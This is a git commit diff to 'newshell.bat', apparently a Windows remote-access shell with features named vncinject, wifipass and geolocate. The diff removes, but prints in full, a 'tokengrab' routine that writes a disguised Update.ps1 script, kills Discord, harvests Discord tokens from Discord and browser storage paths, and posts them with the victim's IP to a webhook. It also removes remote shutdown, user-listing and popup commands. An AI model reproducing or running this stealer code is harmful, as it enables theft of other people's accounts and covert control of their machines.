d3b1a70a1e136406338f228d7271ac466bfdd7de
syskey-del <84145168+syskey-del@users.noreply.github.com>
2025-02-04 16:52:22 -0500

    Update newshell.bat

--- newshell.bat
+++ newshell.bat
@@ -30,11 +30,6 @@ echo.
 goto input
 )
 
-if /I "%input%" EQU "shutdown" (
-set /p shutdownmsg=Shutdown Message: 
-shutdown /s /t 5 /c "%shutdownmsg%"
-)
-
 if /I "%input%" EQU "vncinject" (
 goto vncinject
 )
@@ -58,15 +53,6 @@ goto input
 
 if /I "%input%" EQU "geolocate" (
 goto geolocate
-)
-
-if /I "%input%" EQU "users" (
-net user | findstr /v "The command completed successfully."
-goto input
-)
-
-if /I "%input%" EQU "tokengrab" (
-goto tokengrab
 )
 
 if /I "%input%" EQU "wifipass" (
@@ -141,75 +127,6 @@ goto input
 
 goto input
 
-:tokengrab
-cd %appdata%
-if exist Update.ps1 del /s /q Update.ps1 >nul
-set /p webhook=Webhook URL: 
-echo $hook  = "%webhook%">>Update.ps1
-echo $token = new-object System.Collections.Specialized.StringCollection>>Update.ps1
-echo Stop-Process -Name "Discord" -Force>>Update.ps1
-echo. >>Update.ps1
-echo $db_path = @(>>Update.ps1
-echo     $env:APPDATA + "\Discord\Local Storage\leveldb">>Update.ps1
-echo     $env:APPDATA + "\Roaming\Discord\Local Storage\leveldb">>Update.ps1
-echo     $env:APPDATA + "\Roaming\Lightcord\Local Storage\leveldb">>Update.ps1
-echo     $env:APPDATA + "\Roaming\discordptb\Local Storage\leveldb">>Update.ps1
-echo     $env:APPDATA + "\Roaming\discordcanary\Local Storage\leveldb">>Update.ps1
-echo     $env:APPDATA + "\Roaming\Opera Software\Opera Stable\Local Storage\leveldb">>Update.ps1
-echo     $env:APPDATA + "\Roaming\Opera Software\Opera GX Stable\Local Storage\leveldb">>Update.ps1
-echo. >>Update.ps1
-echo     $env:APPDATA + "\Local\Amigo\User Data\Local Storage\leveldb">>Update.ps1
-echo     $env:APPDATA + "\Local\Torch\User Data\Local Storage\leveldb">>Update.ps1
-echo     $env:APPDATA + "\Local\Kometa\User Data\Local Storage\leveldb">>Update.ps1
-echo     $env:APPDATA + "\Local\Orbitum\User Data\Local Storage\leveldb">>Update.ps1
-echo     $env:APPDATA + "\Local\CentBrowser\User Data\Local Storage\leveldb">>Update.ps1
-echo     $env:APPDATA + "\Local\7Star\7Star\User Data\Local Storage\leveldb">>Update.ps1
-echo     $env:APPDATA + "\Local\Sputnik\Sputnik\User Data\Local Storage\leveldb">>Update.ps1
-echo     $env:APPDATA + "\Local\Vivaldi\User Data\Default\Local Storage\leveldb">>Update.ps1
-echo     $env:APPDATA + "\Local\Google\Chrome SxS\User Data\Local Storage\leveldb">>Update.ps1
-echo     $env:APPDATA + "\Local\Epic Privacy Browser\User Data\Local Storage\leveldb">>Update.ps1
-echo     $env:APPDATA + "\Local\Google\Chrome\User Data\Default\Local Storage\leveldb">>Update.ps1
-echo     $env:APPDATA + "\Local\uCozMedia\Uran\User Data\Default\Local Storage\leveldb">>Update.ps1
-echo     $env:APPDATA + "\Local\Microsoft\Edge\User Data\Default\Local Storage\leveldb">>Update.ps1
-echo     $env:APPDATA + "\Local\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb">>Update.ps1
-echo     $env:APPDATA + "\Local\Opera Software\Opera Neon\User Data\Default\Local Storage\leveldb">>Update.ps1
-echo     $env:APPDATA + "\Local\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb">>Update.ps1
-echo )>>Update.ps1
-echo. >>Update.ps1
-echo foreach ($path in $db_path) {>>Update.ps1
-echo     if (Test-Path $path) {>>Update.ps1
-echo         foreach ($file in Get-ChildItem -Path $path -Name) {>>Update.ps1
-echo             $data = Get-Content -Path "$($path)\$($file)">>Update.ps1
-echo             $regex = [regex] "[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}">>Update.ps1
-echo             $match = $regex.Match($data)>>Update.ps1
-echo. >>Update.ps1
-echo            while ($match.Success) {>>Update.ps1
-echo                 if (!$token.Contains($match.Value)) {>>Update.ps1
-echo                     $token.Add($match.Value) ^| out-null>>Update.ps1
-echo                 }>>Update.ps1
-echo. >>Update.ps1
-echo                $match = $match.NextMatch()>>Update.ps1
-echo             }>>Update.ps1
-echo         }>>Update.ps1
-echo     }>>Update.ps1
-echo }>>Update.ps1
-echo >>Update.ps1
-echo $content = "**Client: %localip%**``` ">>Update.ps1
-echo foreach ($data in $token) {>>Update.ps1
-echo     $content = [string]::Concat($content, "`n", $data)>>Update.ps1
-echo }>>Update.ps1
-echo $content = [string]::Concat($content, "``` ")>>Update.ps1
-echo >>Update.ps1
-echo $JSON = @{ "content"= $content; "username"= "Vindicta"; "avatar_url"= "https://wallpapercave.com/wp/wp8715191.jpg" }  ^| convertto-json>>Update.ps1
-echo Invoke-WebRequest -uri $hook -Method POST -Body $JSON -Headers @{"Content-Type" = "application/json"}>>Update.ps1
-cd %homepath%
-chcp 437 >nul
-powershell.exe -executionpolicy unrestricted "%appdata%\Update.ps1" >nul 2>&1 && del %appdata%\Update.ps1
-chcp 65001 >nul
-goto input
-
-goto input
-
 :getinfo
 curl -s ifconfig.me/ip>>%appdata%\Debug.txt
 :infowait
@@ -234,14 +151,4 @@ echo Manufacturer: %manufacture%
 echo.
 goto input
 
-goto input
-
-:msg
-set /p msgtitle=Title: 
-set /p msgmsg=Message: 
-set /p msgicon=Icon (Information, Error, Warning): 
-chcp 437 >nul
-powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('%msgmsg%', '%msgtitle%', 'OK', [System.Windows.Forms.MessageBoxIcon]::%msgicon%);}"
-chcp 65001 >nul
-echo.
 goto input
